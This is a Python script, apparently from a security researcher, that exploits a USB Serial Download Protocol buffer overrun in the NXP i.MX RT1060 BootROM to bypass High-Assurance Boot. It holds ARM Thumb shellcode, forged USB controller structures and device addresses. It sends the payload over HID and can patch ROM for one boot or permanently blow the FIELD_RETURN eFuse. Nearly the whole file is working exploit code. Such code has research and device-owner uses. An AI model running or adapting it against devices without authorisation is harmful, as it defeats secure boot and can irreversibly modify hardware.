#!/usr/bin/env python3
# Copyright (C) 2026 Thomas Hebb
# SPDX-License-Identifier: GPL-3.0-only

import argparse
import struct

# Upstream hidapi still defaults to libusb for backwards compatibility, so ask
# for the hidraw variant first. If it's not present, we might be on a distro
# that defaults to hidraw. If not, libusb is a fine fallback.
try:
    import hidraw as hid
except ModuleNotFoundError:
    import hid

from keystone import Ks
from keystone.arm_const import *
from keystone.keystone_const import *

from structtuple import structtuple
from targetmemory import TargetMemory

# All immediates in hex to work around https://github.com/keystone-engine/keystone/issues/538.
SHELLCODE_ROMC = """
    # Disable I-Cache. This prevents subsequent exploits on the same boot from
    # running stale code.
    dsb; isb
    ldr r0, =0xe000ed14
    ldr r1, [r0]
    bic r1, #(0x1 << 0x11)
    str r1, [r0]
    dsb; isb
    ldr r0, =0xe000ef50
    movs r1, #0
    str r1, [r0]
    dsb; isb

    # Restore USB functionality by fixing the usb_device pointer we
    # overwrote. This will be picked up only on the next invocation of
    # USB_DeviceEhciIsrFunction().
    ldr r1, =usb_dev
    ldr r0, =sdp_dev
    str r1, [r0]

    # Beginning of ROMC register space
    ldr r0, =romc
    adds r0, #0xd4

    # Write patched code to ROMPATCH0D.
    ldr r1, =hab_config_patch
    str r1, [r0, #0x1c]

    # Write patch address to ROMPATCH0A.
    ldr r1, =hab_get_config
    str r1, [r0, #0x2c]

    # Enable patch 0 in ROMPATCHENL and mark it as a data patch in ROMPATCHCNTL.
    movs r1, #0x1
    str r1, [r0, #0x28]
    str r1, [r0, #0x20]

    # Return kStatus_USB_Success, although it doesn't really matter because
    # USB_DeviceEhciInterruptTokenDone() discards the result.
    movs r0, #0x0
    bx lr
"""

# All immediates in hex to work around https://github.com/keystone-engine/keystone/issues/538.
SHELLCODE_FIELD_RETURN = """
    # Beginning of OCOTP register space
    ldr r0, =ocotp

    # Wait for BUSY (bit 8) in OCOTP_CTRL to clear.
wait_ready:
    ldr r1, [r0, #0x0]
    lsls r1, r1, #(0x1f - 0x8)
    bmi wait_ready

    # If already field returned, do nothing.
    ldr r1, [r0, #0x400]
    # Assembles to "movs r1, r1" since we're already the top bit.
    lsls r1, #(0x1f - 0x1f)
    bmi reset

    # Program timing.
    ldr r1, =ocotp_timing
    str r1, [r0, #0x10]
    ldr r1, =ocotp_timing2
    str r1, [r0, #0x100]

    # Clear WR_UNLOCK, ERROR and ADDR via OCOTP_CTRL_CLR.
    ldr r1, =0xffff023f
    str r1, [r0, #0x8]

    # Set ADDR (eFuse 0) and WR_UNLOCK via OCOTP_CTRL_SET.
    ldr r1, =0x3e770000
    str r1, [r0, #0x4]

    # Blow FIELD_RETURN (bit 31)!
    mov r1, #(0x1 << 0x1f)
    str r1, [r0, 0x20]

    # Wait for OCOTP_CTRL.BUSY (bit 8) to clear.
wait_done:
    ldr r1, [r0, #0x0]
    lsls r1, r1, #(0x1f - 0x8)
    bmi wait_done

reset:
    # Reset into SDP using runBootloader() from ROM API.
    ldr r1, =romapi
    ldr r1, [r1]
    ldr r1, [r1, #0x8]
    adr r0, blarg
    blx r1

    # If reset fails, spin forever since we didn't fix up any state.
spin:
    b spin

    # Argument for runBootloader(), passed by reference
.align 2
blarg:
    .word 0xeb100000
"""


REPORT_INVALID = 0xff

class RT1060Addresses:
    REPORT_BUF = 0x2020723f

    SDP_DEV = 0x20207a3c
    USB_DEV = 0x20207ee8

    # DTCM, not used by BootROM
    SCRATCH_MEM = 0x20000000

    ROMAPI_ROOT = 0x0020001c

    ROMC_BASE = 0x40180000
    OCOTP_BASE = 0x401f4000

    # Don't set Thumb bit because this is for patching not calling.
    HAB_GET_CONFIG_FN = 0x002147f8

    # In BootROM, ipg_clk runs at 132MHz. Program WAIT=19, RELAX=13,
    # STROBE_READ=9, STROBE_PROG=1571, RELAX_READ=1, RELAX_PROG=125 to
    # fulfill datasheet's timing spec.
    OCOTP_TIMING = 0x04c9d623
    OCOTP_TIMING2 = 0x0001007d


def assemble_shellcode(code, addrs, base):
    ks = Ks(KS_ARCH_ARM, KS_MODE_THUMB)

    hab_config_patch, _ = ks.asm("movs r0, #0xf0; bx lr")
    assert(len(hab_config_patch) == 4)

    def sym_resolver(symbol, value):
        addr = {
            # Data pointers
            b"sdp_dev": addrs.SDP_DEV,
            b"usb_dev": addrs.USB_DEV,
            b"romapi": addrs.ROMAPI_ROOT,

            # Data values
            b"hab_get_config": addrs.HAB_GET_CONFIG_FN,
            b"ocotp_timing": addrs.OCOTP_TIMING,
            b"ocotp_timing2": addrs.OCOTP_TIMING2,

            # Peripherals
            b"romc": addrs.ROMC_BASE,
            b"ocotp": addrs.OCOTP_BASE,
        }.get(symbol)

        if addr is not None:
            value.contents.value = addr
            return True

        if symbol == b"hab_config_patch":
            value.contents.value = int.from_bytes(hab_config_patch, "little")
            return True

        return False

    ks.sym_resolver = sym_resolver
    encoded, _ = ks.asm(code, base)

    return encoded


def make_payload(addrs, shellcode):
    payload = TargetMemory(addrs.REPORT_BUF)

    # Use an invalid report to avoid invoking a real SDP operation.
    payload.placerel(0, bytes([REPORT_INVALID]))

    # First determine the target address of all structures our payload will
    # contain, since they may need to reference one another. Put the shellcode
    # last since we don't know its length before assembling it (which requires
    # its address).

    forged_dev_addr = payload.allocate(UsbDeviceStruct._struct.size)
    forged_ehci_addr = payload.allocate(EhciStateStruct._struct.size)

    forged_regs_data = payload.allocate(EhciRegsPartial140._struct.size)
    forged_regs_addr = forged_regs_data - 0x140 # Omit earlier registers to save space

    forged_dtd0_addr = payload.allocate(Dtd._struct.size)

    shellcode_addr = payload.allocate(0)
    shellcode_bytes = assemble_shellcode(shellcode, addrs, shellcode_addr)
    payload.placeabs(shellcode_addr, shellcode_bytes)

    # Now create the structures and populate the payload.

    # usb_device_struct_t from NXP's SDK. This represents the generic USB
    # device and holds function pointers to handle transfers on each endpoint.
    # The rest of our exploit causes the EP0OUT callback, which we point to our
    # shellcode, to be invoked.
    #
    # This is the struct we control a pointer to via the buffer overrun. Only
    # controller_handle is accessed via that pointer, though: the other fields
    # are accessed via the device_handle pointer within controller_handle, so
    # it's crucial we point that here as well.
    forged_dev = UsbDeviceStruct(
        controller_handle=forged_ehci_addr,
        controller_interface=0, # Not used by vulnerable code path
        # Never called, but needs to be nonzero. Use a non-Thumb (even) pointer
        # so that we crash if it does get called.
        device_callback=2,
        # Everything else exists to trick the USB stack into invoking this
        # callback, which points to our shellcode in RAM. RAM is already
        # executable due to a separate bug in the BootROM's MPU enablement.
        ep_callback_packed=EpCallback(shellcode_addr + 1, 0, False)._pack(), # EP0OUT
        device_address=0,
        controller_id=2,
        state=0, # kUSB_DeviceStateConfigured
        is_resetting=False,
    )._pack()
    payload.placeabs(forged_dev_addr, forged_dev)

    # usb_device_ehci_state_struct_t from NXP's SDK. In addition to the device
    # pointer mentioned above, this holds the addresses of the USB peripheral
    # registers and all the DMA structures the USB peripheral uses. We point
    # those at RAM controlled by us, which lets us forge a controller that has
    # just completed transactions on EP0OUT and EP0IN. A nice side effect is
    # that we don't touch any real USB state, so our shellcode can fix USB just
    # by restoring the three bytes corrupted in the buffer overrun.
    forged_ehci = EhciStateStruct(
        device_handle=forged_dev_addr,
        register_base=forged_regs_addr,
        # Vulnerable code only writes, never reads, and we don't want to clobber
        # the real qh struct in case we want to restore normal USB operation
        # from the payload.
        qh=addrs.SCRATCH_MEM,
        dtd=0, # Not used by vulnerable code path
        dtd_free=0,
        dtd_hard_packed=struct.pack("<1I", forged_dtd0_addr),
        dtd_tail_packed=struct.pack("<1I", forged_dtd0_addr),
        dtd_count=0,
        endpoint_count=8,
        is_resetting=False,
        controller_id=2, # kUSB_ControllerEhci0
        speed=2, # USB_SPEED_HIGH
        is_suspending=False,
    )._pack()
    payload.placeabs(forged_ehci_addr, forged_ehci)

    # Set the UI interrupt so that USB_DeviceEhciIsrFunction() calls
    # USB_DeviceEhciInterruptTokenDone(). Set the two endpoints we've given
    # callbacks as complete so USB_DeviceEhciInterruptTokenDone() calls
    # USB_DeviceEhciNotification() to invoke those callbacks.
    interrupts = (1 << 0) # UI (transaction complete)
    forged_regs = EhciRegsPartial140(
        usbcmd=0,
        usbsts=interrupts,
        usbintr=interrupts,
        portsc1=0,
        endptsetupstat=0,
        endptprime=0,
        endptflush=0,
        endptstat=0,
        endptcomplete=(1 << 0), # EP0OUT
    )._pack()
    payload.placeabs(forged_regs_data, forged_regs)

    # One fake dTD for each completed endpoint.
    forged_dtd = Dtd(
        next_dtd_pointer=1, # USB_DEVICE_ECHI_DTD_TERMINATE_MASK
        dtd_token=0, # Completed zero-length transfer
    )._pack()
    payload.placeabs(forged_dtd0_addr, forged_dtd)

    # Only overwrite two of the three bytes we can control, because 1) that's
    # all we need and 2) sending exactly 0x800 bytes of data triggers a bug on
    # the device that makes it wait for a zero-length packet that never arrives.
    # (The exploit still works, but we always see the transaction time out.)
    clobber_bytes = forged_dev_addr.to_bytes(4, "little")[:2]
    payload.placeabs(addrs.SDP_DEV, clobber_bytes)

    return payload


def main():
    parser = argparse.ArgumentParser(
        description="Bypass NXP i.MX RT High-Assurance Boot via USB Serial Download Protocol buffer overrun"
    )
    parser.add_argument(
        "-w", "--write-to-file", type=argparse.FileType("wb"), dest="file",
        help="write the HID exploit payload to FILE (or - stdout) instead of running it on a device",
    )
    parser.add_argument(
        "--permanent", action="store_true",
        help="unlock permanently (by blowing the FIELD_RETURN eFuse) instead of for a single boot (using a ROMC patch)"
    )
    args = parser.parse_args()

    shellcode = SHELLCODE_FIELD_RETURN if args.permanent else SHELLCODE_ROMC
    payload = make_payload(RT1060Addresses, shellcode)

    if args.file is not None:
        args.file.write(payload.buf)
        args.file.close()
    else:
        dev = hid.device()
        dev.open(0x1fc9, 0x0135)

        if args.permanent:
            try:
                doit = "REOPEN" == input(
                    'THIS ACTION IS IRREVERSIBLE. Type "REOPEN" (case-sensitive) to permanently\n'
                    'reopen HAB on your device, or anything else to cancel: '
                )
            except (EOFError, KeyboardInterrupt):
                print();
                doit = False

            if not doit:
                print("Cancelled. Nothing has been done.")
                dev.close()
                return

        print("Generated payload:")
        payload.dump()

        print("Writing payload...")
        res = dev.write(payload.buf)
        if args.permanent:
            print('Exploit written. "FR Blank RT Family" USB product string means success.')
        elif res != len(payload.buf):
            print(f"Exploit failed ({res})")
        else:
            print("Exploit succeeded! HAB is disabled for this boot")

        dev.close()


UsbDeviceStruct = structtuple(
    "UsbDeviceStruct",
    [
        "controller_handle",
        "controller_interface",
        "device_callback",
        "ep_callback_packed",
        "device_address",
        "controller_id",
        "state",
        "is_resetting",
    ],
    "<III96sBBB?",
)

EhciStateStruct = structtuple(
    "EhciStateStruct",
    [
        "device_handle",
        "register_base",
        "qh",
        "dtd",
        "dtd_free",
        "dtd_hard_packed",
        "dtd_tail_packed",
        "dtd_count",
        "endpoint_count",
        "is_resetting",
        "controller_id",
        "speed",
        "is_suspending",
    ],
    "<IIIII32s32sBB?BB?xx",
)

EpCallback = structtuple(
    "EpCallback",
    ["callback_fn", "callback_param", "is_busy"],
    "<II?xxx",
)

EhciRegsPartial140 = structtuple(
    "EhciRegsPartial140",
    [
        "usbcmd",
        "usbsts",
        "usbintr",
        "portsc1",
        "endptsetupstat",
        "endptprime",
        "endptflush",
        "endptstat",
        "endptcomplete",
    ],
    "<III56xI36xIIIII",
)

Dtd = structtuple(
    "Dtd",
    ["next_dtd_pointer", "dtd_token"],
    "<II12x",
)


if __name__ == "__main__":
    main()
